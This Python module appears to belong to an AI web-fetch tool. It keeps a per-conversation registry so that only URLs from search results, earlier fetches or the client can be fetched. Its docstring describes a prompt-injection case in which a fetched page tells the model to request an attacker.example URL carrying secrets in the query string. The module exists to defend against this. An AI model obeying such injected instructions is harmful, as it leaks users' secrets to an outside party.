"""Where did this URL come from?

The SSRF guard in :mod:`hiraraweb.guard` stops the fetcher reaching *your*
network. It does nothing about the opposite direction: a prompt injection on a
fetched page telling the model to retrieve
``https://attacker.example/?data=<secrets>``. That request is to a perfectly
ordinary public address, so every check in the guard passes — and the secrets
leave in the query string.

The hosted web_fetch tool closes this by only fetching URLs that already
appeared in the conversation. This module is that rule: a URL is fetchable only
if something trusted put it there first — a search result, a previous fetch's
final URL, or an explicit registration from the client that owns the
conversation.

What is deliberately *not* a trusted source: links found inside fetched page
content. That is exactly the channel an injected page would use.
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field
from urllib.parse import urlsplit, urlunsplit

# How a URL earned the right to be fetched.
SOURCE_SEARCH = "search"    # returned by web_search
SOURCE_FETCH = "fetch"      # final URL of an earlier fetch (post-redirect)
SOURCE_CLIENT = "client"    # registered by the client that owns the conversation

_DEFAULT_PORTS = {"http": 80, "https": 443}


def normalize_url(url: str) -> str:
    """Canonical form used for provenance comparison.

    Lowercases scheme and host, drops the default port, and discards the
    fragment (never sent to the server, so it cannot carry data out). Path and
    query are preserved exactly — a differing query is a differing request, and
    the query string is the most likely place to smuggle data.
    """
    parts = urlsplit(url.strip())
    host = (parts.hostname or "").lower()
    scheme = parts.scheme.lower()

    try:
        port = parts.port
    except ValueError:
        port = None
    if port is not None and port != _DEFAULT_PORTS.get(scheme):
        host = f"{host}:{port}"

    path = parts.path or "/"
    if len(path) > 1 and path.endswith("/"):
        path = path.rstrip("/")

    return urlunsplit((scheme, host, path, parts.query, ""))


@dataclass
class _Session:
    urls: dict[str, str] = field(default_factory=dict)  # normalized url -> source
    touched_at: float = field(default_factory=time.monotonic)


class UrlRegistry:
    """Per-conversation record of which URLs are legitimately reachable.

    Held in memory rather than SQLite: this is conversation-scoped state, and
    losing it on restart should fail closed (a URL becomes unknown again),
    which is the safe direction.
    """

    def __init__(self, ttl: int = 3600, max_urls_per_session: int = 2000) -> None:
        self.ttl = ttl
        self.max_urls_per_session = max_urls_per_session
        self._sessions: dict[str, _Session] = {}
        self._lock = threading.Lock()

    def _expire(self, now: float) -> None:
        stale = [key for key, s in self._sessions.items() if now - s.touched_at > self.ttl]
        for key in stale:
            del self._sessions[key]

    def register(self, session_id: str, urls, source: str) -> int:
        """Record URLs as fetchable within ``session_id``. Returns how many were new."""
        if not session_id:
            return 0

        now = time.monotonic()
        added = 0
        with self._lock:
            self._expire(now)
            session = self._sessions.setdefault(session_id, _Session())
            session.touched_at = now

            for url in urls:
                if not isinstance(url, str) or not url.strip():
                    continue
                key = normalize_url(url)
                if key in session.urls:
                    continue
                if len(session.urls) >= self.max_urls_per_session:
                    # Oldest-first eviction. dicts preserve insertion order.
                    session.urls.pop(next(iter(session.urls)))
                session.urls[key] = source
                added += 1
        return added

    def source_of(self, session_id: str, url: str) -> str | None:
        """How ``url`` became known in this session, or ``None`` if it never did."""
        if not session_id:
            return None
        now = time.monotonic()
        with self._lock:
            self._expire(now)
            session = self._sessions.get(session_id)
            if session is None:
                return None
            session.touched_at = now
            return session.urls.get(normalize_url(url))

    def is_known(self, session_id: str, url: str) -> bool:
        return self.source_of(session_id, url) is not None

    def forget(self, session_id: str) -> bool:
        with self._lock:
            return self._sessions.pop(session_id, None) is not None

    def stats(self) -> dict:
        with self._lock:
            self._expire(time.monotonic())
            return {
                "sessions": len(self._sessions),
                "urls": sum(len(s.urls) for s in self._sessions.values()),
            }
